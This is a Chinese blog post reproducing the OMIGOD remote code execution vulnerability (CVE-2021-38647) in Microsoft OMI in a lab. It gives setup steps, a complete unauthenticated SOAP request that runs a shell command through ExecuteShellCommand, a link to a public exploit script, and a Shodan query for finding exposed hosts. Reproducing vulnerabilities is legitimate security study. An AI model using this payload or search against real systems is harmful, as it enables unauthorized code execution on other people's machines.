---
title: OMIGOD RcE
tags:
  - vuln
  - CVE-2021-38647
categories:
  - 漏洞复现
copyright: true
abbrlink: c089dc91
index_img: https://z3.ax1x.com/2021/10/01/47pRaQ.png
date: 2021-10-01 13:21:28
---


近日国外Wiz.io团队研究人员发现了omi多个漏洞  ，其中重点是RcE（CVE-2021-38647），称之为 OMIGOD，存在漏洞版本为 1.6.8.0 及以下版本中的开放管理基础设施 (OMIagent）。

### 本地环境

CentOS 7

omi v1.6.8-0 (https://github.com/microsoft/omi/releases)

​	`omi-1.6.8-0.ssl_110.ulinux.x64.deb`

SCXcore（https://github.com/microsoft/SCXcore/releases）

​	`scx-1.6.6-0.ssl_110.universal.x64.deb`

### 0x01安装 omi和SCXcore

```bash
wget https://github.com/microsoft/omi/releases/download/v1.6.8-0/omi-1.6.8-0.ssl_110.ulinux.x64.deb
wget https://github.com/microsoft/SCXcore/releases/download/v1.6.8-1/scx-1.6.8-1.ssl_110.ulinux.x64.deb
-------------------------------------------------------------------------------
sec@ubuntu:~/tmp$ sudo dpkg -i omi-1.6.8-0.ssl_110.ulinux.x64.deb
[sudo] password for sec:
Selecting previously unselected package omi.
(Reading database ... 71462 files and directories currently installed.)
Preparing to unpack omi-1.6.8-0.ssl_110.ulinux.x64.deb ...
Creating omiusers group ...
Creating omi group ...
Creating omi service account ...
Unpacking omi (1.6.8.0) ...
Setting up omi (1.6.8.0) ...
Generating a RSA private key
....................+++++
.......+++++
writing new private key to '/etc/opt/omi/ssl/omikey.pem'
-----
2021-09-19 12:25:52 : Crontab not configured to update omi keytab automatically. Skip unconfigure
ktutil not found
Checking if cron is installed...
Checking if cron/crond service is started...
Set up a cron job to OMI logrotate every 15 minutes
Configuring OMI service ...
Created symlink /etc/systemd/system/multi-user.target.wants/omid.service → /lib/systemd/system/omid.service.
Trying to start omi with systemctl
omi is started.
Processing triggers for systemd (245.4-4ubuntu3.11) ...
sec@ubuntu:~/tmp$ sudo dpkg -i scx-1.6.8-1.ssl_110.ulinux.x64.deb
Selecting previously unselected package scx.
(Reading database ... 71525 files and directories currently installed.)
Preparing to unpack scx-1.6.8-1.ssl_110.ulinux.x64.deb ...
Unpacking scx (1.6.8.1) ...
Setting up scx (1.6.8.1) ...
Generating certificate with hostname="ubuntu"

WARNING!
Could not read 256 bytes of random data from /dev/random. Will revert to less secure /dev/urandom.
See the security guide for how to regenerate certificates at a later time when more random data might be available.

Trying to stop omi with systemctl
omi is stopped.
Trying to start omi with systemctl
omi is started.
sec@ubuntu:~/tmp$

```

### 0x02修改监听端口

sudo vi /etc/opt/omi/conf/omiserver.conf

![](https://z3.ax1x.com/2021/10/01/47p2Vg.png)

重启omi服务

```bash
sec@ubuntu:~/tmp$ sudo service omid restart
sec@ubuntu:~/tmp$ ss -ant
State    Recv-Q   Send-Q       Local Address:Port        Peer Address:Port    Process
LISTEN   0        128              127.0.0.1:6010             0.0.0.0:*
LISTEN   0        4096         127.0.0.53%lo:53               0.0.0.0:*
LISTEN   0        128                0.0.0.0:22               0.0.0.0:*
ESTAB    0        48         192.168.176.141:22         192.168.176.1:53524
ESTAB    0        0          192.168.176.141:22         192.168.176.1:53526
LISTEN   0        128                  [::1]:6010                [::]:*
LISTEN   0        15                       *:5986                   *:*
LISTEN   0        128                   [::]:22                  [::]:*
sec@ubuntu:~/tmp$
```

### 0x03 Exploit

请求包：

```sqlite
POST https://192.168.176.141:5986/wsman HTTP/1.1
Host: 192.168.176.141:5986
User-Agent: python-requests/2.25.1
Accept: */*
Connection: keep-alive
Content-Type: application/soap+xml;charset=UTF-8
Content-Length: 1645

<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema">
   <s:Header>
      <a:To>HTTP://192.168.1.1:5986/wsman/</a:To>
      <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
      <a:ReplyTo>
         <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
      </a:ReplyTo>
      <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
      <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
      <a:MessageID>uuid:0AB58087-C2C3-0005-0000-000000010000</a:MessageID>
      <w:OperationTimeout>PT1M30S</w:OperationTimeout>
      <w:Locale xml:lang="en-us" s:mustUnderstand="false" />
      <p:DataLocale xml:lang="en-us" s:mustUnderstand="false" />
      <w:OptionSet s:mustUnderstand="true" />
      <w:SelectorSet>
         <w:Selector Name="__cimnamespace">root/scx</w:Selector>
      </w:SelectorSet>
   </s:Header>
   <s:Body>
      <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
         <p:command>id</p:command>
         <p:timeout>0</p:timeout>
      </p:ExecuteShellCommand_INPUT>
   </s:Body>
</s:Envelope>

```

以上请求数据包放到burpsuite重发，由于证书软件bp会提示无法连接到目标。可以使用py发送请求直接rce。

​	https://github.com/horizon3ai/CVE-2021-38647

```bash
──╼ $python3 omigod.py -h
usage: omigod.py [-h] -t TARGET [-c COMMAND]

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        The IP address of the target
  -c COMMAND, --command COMMAND
                        The command to run
```

![](https://z3.ax1x.com/2021/10/01/47pW5j.png)

### shodan搜索

`port:5986 ssl:"cloudapp.net"`

![](https://z3.ax1x.com/2021/10/01/47pRaQ.png)

看着数量是蛮大的，然而一个都没成功，感觉很鸡肋.....

